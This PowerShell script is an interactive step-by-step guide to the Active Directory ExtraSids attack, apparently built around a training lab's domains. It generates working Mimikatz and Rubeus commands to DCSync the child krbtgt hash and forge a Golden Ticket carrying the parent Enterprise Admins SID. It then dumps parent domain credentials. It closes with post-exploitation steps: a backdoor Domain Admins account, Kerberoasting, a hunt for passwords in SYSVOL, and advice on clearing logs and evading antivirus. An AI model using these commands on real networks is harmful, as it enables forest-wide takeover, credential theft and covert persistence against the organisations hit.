# ====================================================================
# Child -> Parent Domain Trust Attack - Complete Guide
# Author: Security Toolkit - Step-by-Step Edition
# Description: Guided walkthrough for ExtraSids attack from Windows
# ====================================================================

<#
.SYNOPSIS
    Complete step-by-step guide for attacking parent domain from child domain.

.DESCRIPTION
    This script provides a detailed walkthrough of the ExtraSids attack,
    explaining each step and generating all necessary commands.

.PARAMETER ChildDomain
    Child domain FQDN (default: auto-detect)

.PARAMETER ParentDomain
    Parent domain FQDN (default: auto-detect)

.PARAMETER FakeUsername
    Username for golden ticket (default: "hacker")

.EXAMPLE
    .\Invoke-ChildToParentGuide.ps1
    
.EXAMPLE
    .\Invoke-ChildToParentGuide.ps1 -ChildDomain "LOGISTICS.INLANEFREIGHT.LOCAL" -ParentDomain "INLANEFREIGHT.LOCAL"
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$ChildDomain,
    
    [Parameter(Mandatory=$false)]
    [string]$ParentDomain,
    
    [Parameter(Mandatory=$false)]
    [string]$FakeUsername = "hacker"
)

# ============================================================================
#                           HELPER FUNCTIONS
# ============================================================================

function Show-Banner {
    Clear-Host
    $banner = @"
    
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     Child → Parent Domain Trust Attack Guide                 ║
║     Complete Step-by-Step Walkthrough                        ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝

"@
    Write-Host $banner -ForegroundColor Cyan
}

function Show-Step {
    param(
        [string]$StepNumber,
        [string]$Title,
        [string]$Description,
        [string]$Command,
        [string]$Why = "",
        [string]$Expected = "",
        [string[]]$Notes = @()
    )
    
    Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
    Write-Host "║  STEP $StepNumber : $Title" -ForegroundColor Yellow
    Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
    
    if ($Description) {
        Write-Host "`n[*] Description:" -ForegroundColor Cyan
        Write-Host "    $Description" -ForegroundColor White
    }
    
    if ($Why) {
        Write-Host "`n[?] Why this step?" -ForegroundColor Magenta
        Write-Host "    $Why" -ForegroundColor Gray
    }
    
    if ($Command) {
        Write-Host "`n[>] Command to execute:" -ForegroundColor Green
        Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
        Write-Host $Command -ForegroundColor White
        Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    }
    
    if ($Expected) {
        Write-Host "`n[+] Expected output:" -ForegroundColor Green
        Write-Host "    $Expected" -ForegroundColor Gray
    }
    
    if ($Notes.Count -gt 0) {
        Write-Host "`n[!] Important notes:" -ForegroundColor Yellow
        foreach ($note in $Notes) {
            Write-Host "    • $note" -ForegroundColor Gray
        }
    }
}

function Wait-ForUser {
    Write-Host "`n" -NoNewline
    Write-Host "Press any key to continue to next step..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Read-UserInput {
    param(
        [string]$Prompt,
        [switch]$Required
    )
    
    do {
        Write-Host "`n$Prompt" -ForegroundColor Green -NoNewline
        $input = Read-Host
        
        if ($Required -and [string]::IsNullOrWhiteSpace($input)) {
            Write-Host "[!] This field is required!" -ForegroundColor Red
        }
    } while ($Required -and [string]::IsNullOrWhiteSpace($input))
    
    return $input.Trim()
}

function Show-Summary {
    param(
        [hashtable]$Data
    )
    
    Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║              COLLECTED DATA SUMMARY                           ║" -ForegroundColor Cyan
    Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    
    Write-Host "`n┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Gray
    foreach ($key in $Data.Keys | Sort-Object) {
        $value = $Data[$key]
        $keyLabel = "${key}:"
        Write-Host "│ " -NoNewline -ForegroundColor Gray
        Write-Host ("{0,-25}" -f $keyLabel) -NoNewline -ForegroundColor White
        Write-Host ("{0,-30}" -f $value) -NoNewline -ForegroundColor Cyan
        Write-Host " │" -ForegroundColor Gray
    }
    Write-Host "└─────────────────────────────────────────────────────────────┘" -ForegroundColor Gray
}

# ============================================================================
#                           MAIN ATTACK GUIDE
# ============================================================================

Show-Banner

Write-Host "This script will guide you through the complete Child → Parent domain attack." -ForegroundColor Yellow
Write-Host "You will execute each command manually and provide the results.`n" -ForegroundColor Yellow

Wait-ForUser

# ========== DETECT CURRENT ENVIRONMENT ==========
Write-Host "`n[*] Detecting current environment..." -ForegroundColor Cyan

try {
    $currentDomainFQDN = (Get-WmiObject Win32_ComputerSystem).Domain
    $currentDomainNetBIOS = $currentDomainFQDN.Split('.')[0]
    Write-Host "[+] Current Domain: $currentDomainFQDN" -ForegroundColor Green
    Write-Host "[+] NetBIOS Name: $currentDomainNetBIOS" -ForegroundColor Green
    
    if (-not $ChildDomain) {
        $ChildDomain = $currentDomainFQDN
    }
} catch {
    Write-Host "[!] Could not auto-detect domain" -ForegroundColor Yellow
    if (-not $ChildDomain) {
        $ChildDomain = Read-UserInput -Prompt "[?] Enter child domain FQDN (e.g., LOGISTICS.INLANEFREIGHT.LOCAL): " -Required
    }
}

$ChildNetBIOS = $ChildDomain.Split('.')[0]

# Auto-detect parent domain if not specified
if (-not $ParentDomain) {
    $domainParts = $ChildDomain.Split('.')
    if ($domainParts.Count -gt 2) {
        # Likely a child domain (e.g., LOGISTICS.INLANEFREIGHT.LOCAL)
        $ParentDomain = $domainParts[1..($domainParts.Count-1)] -join '.'
        Write-Host "[+] Detected parent domain: $ParentDomain" -ForegroundColor Green
    } else {
        $ParentDomain = Read-UserInput -Prompt "[?] Enter parent domain FQDN (e.g., INLANEFREIGHT.LOCAL): " -Required
    }
}

$ParentNetBIOS = $ParentDomain.Split('.')[0]

Write-Host "`n[+] Attack Configuration:" -ForegroundColor Cyan
Write-Host "    Child Domain:  $ChildDomain ($ChildNetBIOS)" -ForegroundColor White
Write-Host "    Parent Domain: $ParentDomain ($ParentNetBIOS)" -ForegroundColor White
Write-Host "    Fake User:     $FakeUsername" -ForegroundColor White

Wait-ForUser

# Initialize data collection
$AttackData = @{}

# ============================================================================
#                         PHASE 1: INITIAL SETUP
# ============================================================================

Show-Step -StepNumber 1 -Title "Open PowerShell as Administrator & Launch Mimikatz" `
    -Description "We need to run Mimikatz with administrator privileges to perform DCSync attacks." `
    -Command "# In an Administrator PowerShell window:`ncd C:\Tools\mimikatz`n.\mimikatz.exe" `
    -Why "DCSync requires administrator privileges and the ability to impersonate a Domain Controller. Mimikatz provides this capability." `
    -Notes @(
        "Right-click PowerShell → Run as Administrator",
        "Navigate to your Mimikatz directory",
        "Common locations: C:\Tools\, Desktop, Downloads",
        "Alternative: Use x64\mimikatz.exe for 64-bit systems"
    )

Wait-ForUser

# ============================================================================
#                    PHASE 2: EXTRACT KRBTGT HASH
# ============================================================================

$dcsyncCommand = "lsadump::dcsync /user:$ChildNetBIOS\krbtgt"

Show-Step -StepNumber 2 -Title "Extract KRBTGT Hash from Child Domain" `
    -Description "Use DCSync to extract the KRBTGT account hash from the child domain." `
    -Command "mimikatz # $dcsyncCommand" `
    -Why "We need the KRBTGT hash to create a Golden Ticket. KRBTGT is the Kerberos service account that signs all TGTs (Ticket Granting Tickets).

Why we chose '$ChildNetBIOS' (LOGISTICS):
    • This is the CURRENT domain we have admin access to (the child domain)
    • We cannot DCSync the parent domain yet (no access)
    • The KRBTGT hash from the CHILD domain is what we use to create our Golden Ticket
    • The Golden Ticket will include the Parent Domain's Enterprise Admins SID (ExtraSids attack)
    • This allows us to escalate from child domain admin → parent domain admin" `
    -Expected "Look for: 'Hash NTLM: [32 character hex string]'" `
    -Notes @(
        "The NTLM hash is what we need (not AES keys)",
        "Copy the entire 32-character hash",
        "You'll also see the domain SID in this output"
    )

Wait-ForUser

$krbtgtHash = Read-UserInput -Prompt "[?] Enter the KRBTGT NTLM hash (32 characters): " -Required
$AttackData["KRBTGT Hash"] = $krbtgtHash

# Validate hash format
if ($krbtgtHash -notmatch '^[a-fA-F0-9]{32}$') {
    Write-Host "[!] WARNING: Hash format looks incorrect (should be 32 hex characters)" -ForegroundColor Red
}

# ============================================================================
#                    PHASE 3: GET CHILD DOMAIN SID
# ============================================================================

Show-Step -StepNumber 3 -Title "Get Child Domain SID (From Mimikatz Output)" `
    -Description "The domain SID is visible in the DCSync output above, but we can also get it with PowerView." `
    -Why "We need the child domain's SID to create the Golden Ticket. The SID identifies the domain and will be used as the base for our ticket." `
    -Expected "The SID is in the Mimikatz output under 'Object Security ID'" `
    -Notes @(
        "Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX",
        "This should be visible in the DCSync output above",
        "Last number (RID) for KRBTGT is typically 502"
    )

Wait-ForUser

Show-Step -StepNumber 4 -Title "Alternative: Use PowerView to Get Domain SID" `
    -Description "If you didn't see the SID in Mimikatz output, use PowerView." `
    -Command "Get-DomainSID" `
    -Notes @(
        "Requires PowerView to be loaded",
        "Alternative: Get-ADDomain | Select-Object DomainSID",
        "Alternative: (Get-ADDomain).DomainSID.Value"
    )

Wait-ForUser

$childDomainSID = Read-UserInput -Prompt "[?] Enter the Child Domain SID: " -Required
$AttackData["Child Domain"] = $ChildDomain
$AttackData["Child Domain SID"] = $childDomainSID

# ============================================================================
#                PHASE 4: GET ENTERPRISE ADMINS SID
# ============================================================================

$eaCommand = "Get-DomainGroup -Domain $ParentDomain -Identity `"Enterprise Admins`" | select distinguishedname,objectsid"

Show-Step -StepNumber 5 -Title "Get Enterprise Admins SID from Parent Domain" `
    -Description "Query the parent domain for the Enterprise Admins group SID." `
    -Command $eaCommand `
    -Why "Enterprise Admins is a group that exists ONLY in the forest root domain and has admin rights across ALL domains in the forest. By adding this SID to our Golden Ticket (ExtraSids), we gain Enterprise Admin privileges in the parent domain!" `
    -Expected "objectsid : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-519" `
    -Notes @(
        "The SID will end with -519 (Enterprise Admins RID)",
        "Alternative: Get-ADGroup -Server $ParentDomain -Identity 'Enterprise Admins'",
        "This is the key to the ExtraSids attack!",
        "Format: S-1-5-21-{Parent-Domain-SID}-519"
    )

Wait-ForUser

$eaSID = Read-UserInput -Prompt "[?] Enter the Enterprise Admins SID: " -Required
$AttackData["Parent Domain"] = $ParentDomain
$AttackData["Enterprise Admins SID"] = $eaSID

# ============================================================================
#              PHASE 5: CONFIRM NO ACCESS (BEFORE ATTACK)
# ============================================================================

$testAccessCommand = "ls \\academy-ea-dc01.$ParentDomain\c$"

Show-Step -StepNumber 6 -Title "Confirm We Have NO Access to Parent Domain (Yet)" `
    -Description "Test that we currently cannot access the parent domain controller." `
    -Command $testAccessCommand `
    -Why "This proves we don't have access YET. After the Golden Ticket attack, this same command will work!" `
    -Expected "Access is denied" `
    -Notes @(
        "Try: ls \\$ParentDomain\c$",
        "Try: ls \\DC01.$ParentDomain\c$",
        "You should get 'Access is denied' error",
        "If you already have access, the attack may not be necessary!"
    )

Wait-ForUser

$hasAccessBefore = Read-UserInput -Prompt "[?] Did you get 'Access Denied'? (Y/N): "
if ($hasAccessBefore -eq 'N' -or $hasAccessBefore -eq 'n') {
    Write-Host "[!] Warning: You already have access to the parent domain!" -ForegroundColor Yellow
}

# Show summary before attack
Show-Summary -Data $AttackData
Wait-ForUser

# ============================================================================
#           PHASE 6: CREATE GOLDEN TICKET (MIMIKATZ METHOD)
# ============================================================================

$goldenTicketCommand = @"
kerberos::golden /user:$FakeUsername /domain:$ChildDomain /sid:$childDomainSID /krbtgt:$krbtgtHash /sids:$eaSID /ptt
"@

Show-Step -StepNumber 7 -Title "Create Golden Ticket with ExtraSids (Mimikatz)" `
    -Description "Now we create the Golden Ticket that includes the Enterprise Admins SID!" `
    -Command "mimikatz # $goldenTicketCommand" `
    -Why "This is the CORE of the ExtraSids attack!

Command breakdown:
    /user:$FakeUsername              → Fake username (doesn't need to exist)
    /domain:$ChildDomain             → Our current domain (child)
    /sid:$childDomainSID             → Child domain SID
    /krbtgt:$krbtgtHash              → KRBTGT hash from child domain
    /sids:$eaSID                     → EXTRA SID = Enterprise Admins from PARENT!
    /ptt                             → Pass-The-Ticket (inject into memory)

The magic: By adding the parent's Enterprise Admins SID to a ticket from the CHILD domain, 
we can access the PARENT domain as if we were Enterprise Admins!" `
    -Expected "[+] Ticket successfully imported!" `
    -Notes @(
        "The ticket is injected directly into memory (/ptt)",
        "No need to save to file",
        "The ticket will work for ~10 hours by default",
        "You should see 'Golden ticket for <user> successfully submitted'"
    )

Wait-ForUser

$mimikatzSuccess = Read-UserInput -Prompt "[?] Did Mimikatz successfully create the ticket? (Y/N): "

# ============================================================================
#              PHASE 7: CONFIRM TICKET IN MEMORY
# ============================================================================

Show-Step -StepNumber 8 -Title "Confirm Kerberos Ticket is in Memory" `
    -Description "Verify that our Golden Ticket was successfully injected." `
    -Command "klist" `
    -Why "klist shows all Kerberos tickets currently in memory. We should see our fake user's ticket." `
    -Expected "Client: $FakeUsername @ $ChildDomain
Server: krbtgt/$ChildDomain @ $ChildDomain" `
    -Notes @(
        "Look for your fake username in the output",
        "The ticket should be for 'krbtgt' service",
        "Ticket Flags should include 'forwardable renewable initial'",
        "If you don't see it, the injection failed"
    )

Wait-ForUser

# ============================================================================
#           PHASE 8: TEST ACCESS TO PARENT DOMAIN
# ============================================================================

$testAccessCommand2 = "ls \\academy-ea-dc01.$ParentDomain\c$"

Show-Step -StepNumber 9 -Title "Test Access to Parent Domain Controller" `
    -Description "Now try accessing the parent domain - it should work!" `
    -Command $testAccessCommand2 `
    -Why "If the ExtraSids attack worked, we now have Enterprise Admin rights in the parent domain!" `
    -Expected "Directory listing of C:\ drive" `
    -Notes @(
        "You should now see files/folders (not 'Access Denied'!)",
        "Try multiple DCs if one fails: DC01, DC02, AD01, etc.",
        "Alternative: ls \\$ParentDomain\SYSVOL",
        "This confirms SUCCESSFUL compromise!"
    )

Wait-ForUser

$hasAccessAfter = Read-UserInput -Prompt "[?] Do you now have access to the parent domain? (Y/N): "

if ($hasAccessAfter -eq 'Y' -or $hasAccessAfter -eq 'y') {
    Write-Host "`n[+] SUCCESS! ExtraSids attack worked!" -ForegroundColor Green
    Write-Host "[+] You now have Enterprise Admin privileges in $ParentDomain!" -ForegroundColor Green
} else {
    Write-Host "`n[!] Access still denied. Possible issues:" -ForegroundColor Red
    Write-Host "    • SID filtering may be enabled on the trust" -ForegroundColor Yellow
    Write-Host "    • Wrong Enterprise Admins SID" -ForegroundColor Yellow
    Write-Host "    • Golden ticket not created correctly" -ForegroundColor Yellow
}

Wait-ForUser

# ============================================================================
#            ALTERNATIVE: RUBEUS METHOD
# ============================================================================

Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
Write-Host "║              ALTERNATIVE METHOD: RUBEUS                       ║" -ForegroundColor Magenta
Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Magenta

Write-Host "`nIf you prefer to use Rubeus instead of Mimikatz, here's how:" -ForegroundColor Yellow

Show-Step -StepNumber "A1" -Title "Confirm No Access (Rubeus Method)" `
    -Description "First, confirm you don't have access (same as before)." `
    -Command "ls \\academy-ea-dc01.$ParentDomain\c$" `
    -Expected "Access is denied"

$rubeusCommand = @"
.\Rubeus.exe golden /rc4:$krbtgtHash /domain:$ChildDomain /sid:$childDomainSID /sids:$eaSID /user:$FakeUsername /ptt
"@

Show-Step -StepNumber "A2" -Title "Create Golden Ticket with Rubeus" `
    -Description "Use Rubeus to create and inject the Golden Ticket." `
    -Command $rubeusCommand `
    -Why "Rubeus is a more modern alternative to Mimikatz for Kerberos attacks. The command parameters are similar but slightly different syntax.

Parameter differences from Mimikatz:
    /rc4:    → NTLM hash (instead of /krbtgt:)
    /domain: → Same
    /sid:    → Same  
    /sids:   → Same (ExtraSids)
    /user:   → Same
    /ptt:    → Same (Pass-The-Ticket)" `
    -Expected "[+] Ticket successfully imported!" `
    -Notes @(
        "Rubeus uses /rc4: instead of /krbtgt:",
        "The rest is identical to Mimikatz",
        "Rubeus is less likely to be flagged by AV",
        "Output will show base64 encoded ticket"
    )

Show-Step -StepNumber "A3" -Title "Confirm Ticket with Rubeus" `
    -Description "Verify the ticket is in memory." `
    -Command "klist" `
    -Expected "Same as Step 8 - ticket for fake user should be visible"

Wait-ForUser

# ============================================================================
#              PHASE 9: DCSYNC PARENT DOMAIN
# ============================================================================

Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║         EXPLOITATION: DCSYNC PARENT DOMAIN                    ║" -ForegroundColor Green
Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Green

$dcsyncParentCommand = "lsadump::dcsync /user:$ParentNetBIOS\lab_adm /domain:$ParentDomain"

Show-Step -StepNumber 10 -Title "DCSync Attack on Parent Domain" `
    -Description "Now extract credentials from the parent domain!" `
    -Command "mimikatz # $dcsyncParentCommand" `
    -Why "With Enterprise Admin rights, we can now DCSync ANY account from the parent domain, including Domain Admins and the Administrator!

CRITICAL: Notice the /domain:$ParentDomain parameter!
    • Without this, Mimikatz will query YOUR current domain (LOGISTICS) 
    • The user 'INLANEFREIGHT\lab_adm' doesn't exist in LOGISTICS domain
    • You'll get ERROR: 'invalid dwOutVersion (6) and/or cNumObjects (0)'
    • The /domain: parameter tells Mimikatz which DC to contact
    • This is ESSENTIAL for cross-domain DCSync attacks!" `
    -Expected "NTLM hash of lab_adm user" `
    -Notes @(
        "MUST use /domain:$ParentDomain for cross-domain DCSync!",
        "Try: lsadump::dcsync /user:$ParentNetBIOS\Administrator /domain:$ParentDomain",
        "Try: lsadump::dcsync /domain:$ParentDomain /all /csv (all hashes!)",
        "This proves complete compromise of parent domain"
    )

Wait-ForUser

# Show alternative for multi-domain environments
$dcsyncWithDomain = "lsadump::dcsync /user:$ParentNetBIOS\lab_adm /domain:$ParentDomain"

Show-Step -StepNumber 11 -Title "DCSync with Explicit Domain (Multi-Domain)" `
    -Description "When dealing with multiple domains, specify the exact domain." `
    -Command "mimikatz # $dcsyncWithDomain" `
    -Why "In complex environments with multiple domains, we need to specify which domain controller to query. This ensures we're targeting the correct domain." `
    -Notes @(
        "Use this when target domain ≠ current user's domain",
        "Explicitly specifies the DC to query",
        "More reliable in multi-domain forests",
        "Format: /user:DOMAIN\username /domain:DOMAIN.FQDN"
    )

Wait-ForUser

$gotHash = Read-UserInput -Prompt "[?] Did you successfully extract the hash? (Y/N): "

if ($gotHash -eq 'Y' -or $gotHash -eq 'y') {
    $adminHash = Read-UserInput -Prompt "[?] (Optional) Paste the NTLM hash: "
    if (-not [string]::IsNullOrWhiteSpace($adminHash)) {
        $AttackData["Admin Hash"] = $adminHash
    }
}

# ============================================================================
#                    FINAL SUMMARY & NEXT STEPS
# ============================================================================

Write-Host "`n`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║                                                               ║" -ForegroundColor Green
Write-Host "║              ATTACK COMPLETED SUCCESSFULLY!                   ║" -ForegroundColor Green
Write-Host "║                                                               ║" -ForegroundColor Green
Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Green

Write-Host "`n[+] Congratulations! You've successfully compromised the parent domain!" -ForegroundColor Cyan

Show-Summary -Data $AttackData

Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
Write-Host "║              NEXT STEPS & POST-EXPLOITATION                   ║" -ForegroundColor Yellow
Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Yellow

Write-Host "`n1. CREATE PERSISTENT ACCESS:" -ForegroundColor Cyan
Write-Host "   net user backdoor Password123! /add /domain:$ParentDomain" -ForegroundColor Gray
Write-Host "   net group `"Domain Admins`" backdoor /add /domain:$ParentDomain" -ForegroundColor Gray

Write-Host "`n2. DUMP ALL DOMAIN CREDENTIALS:" -ForegroundColor Cyan
Write-Host "   mimikatz # lsadump::dcsync /domain:$ParentDomain /all /csv" -ForegroundColor Gray
Write-Host "   # Exports all password hashes to CSV" -ForegroundColor DarkGray

Write-Host "`n3. ACCESS DOMAIN CONTROLLERS:" -ForegroundColor Cyan
Write-Host "   Enter-PSSession -ComputerName DC01.$ParentDomain" -ForegroundColor Gray
Write-Host "   \\DC01.$ParentDomain\c$" -ForegroundColor Gray

Write-Host "`n4. KERBEROAST HIGH-VALUE ACCOUNTS:" -ForegroundColor Cyan
Write-Host "   Get-DomainUser -SPN -Domain $ParentDomain | Get-DomainSPNTicket -Format Hashcat" -ForegroundColor Gray

Write-Host "`n5. SEARCH FOR SENSITIVE DATA:" -ForegroundColor Cyan
Write-Host "   ls \\$ParentDomain\SYSVOL -Recurse | Where-Object {`$_.Name -like '*password*'}" -ForegroundColor Gray
Write-Host "   # Look for Group Policy Preferences, scripts with passwords, etc." -ForegroundColor DarkGray

Write-Host "`n6. ENUMERATE ADMIN ACCOUNTS:" -ForegroundColor Cyan
Write-Host "   Get-DomainGroupMember -Domain $ParentDomain -Identity 'Domain Admins'" -ForegroundColor Gray
Write-Host "   Get-DomainGroupMember -Domain $ParentDomain -Identity 'Enterprise Admins'" -ForegroundColor Gray

Write-Host "`n7. LATERAL MOVEMENT:" -ForegroundColor Cyan
Write-Host "   # Use extracted hashes for Pass-the-Hash attacks" -ForegroundColor Gray
Write-Host "   # Create Silver Tickets for specific services" -ForegroundColor Gray
Write-Host "   # Access other domain controllers and servers" -ForegroundColor Gray

Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "║              CLEANUP & OPSEC                                  ║" -ForegroundColor Red
Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Red

Write-Host "`n[!] Remember to clean up after the engagement:" -ForegroundColor Yellow
Write-Host "    • Clear Kerberos tickets: klist purge" -ForegroundColor Gray
Write-Host "    • Remove created accounts: net user backdoor /delete" -ForegroundColor Gray
Write-Host "    • Clear PowerShell history: Clear-History" -ForegroundColor Gray
Write-Host "    • Remove tools from disk" -ForegroundColor Gray
Write-Host "    • Clear Windows Event Logs (if authorized)" -ForegroundColor Gray

Write-Host "`n╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
Write-Host "║              COMPLETE COMMAND REFERENCE                       ║" -ForegroundColor Magenta
Write-Host "╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Magenta

Write-Host "`nAll commands used in this attack:" -ForegroundColor Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray

$allCommands = @"
# 1. DCSync child domain KRBTGT
mimikatz # lsadump::dcsync /user:$ChildNetBIOS\krbtgt

# 2. Get child domain SID
Get-DomainSID

# 3. Get Enterprise Admins SID
Get-DomainGroup -Domain $ParentDomain -Identity "Enterprise Admins" | select objectsid

# 4. Test access (before)
ls \\$ParentDomain\c$

# 5. Create Golden Ticket (Mimikatz)
mimikatz # $goldenTicketCommand

# 6. Create Golden Ticket (Rubeus)
$rubeusCommand

# 7. Verify ticket
klist

# 8. Test access (after)
ls \\$ParentDomain\c$

# 9. DCSync parent domain
mimikatz # lsadump::dcsync /user:$ParentNetBIOS\lab_adm /domain:$ParentDomain
"@

Write-Host $allCommands -ForegroundColor White
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray

Write-Host "`n[+] Attack guide completed!" -ForegroundColor Green
Write-Host "[+] You now have full control over the parent domain: $ParentDomain" -ForegroundColor Green
Write-Host "`n[*] Good luck and happy hunting! 🎯" -ForegroundColor Cyan
Write-Host ""
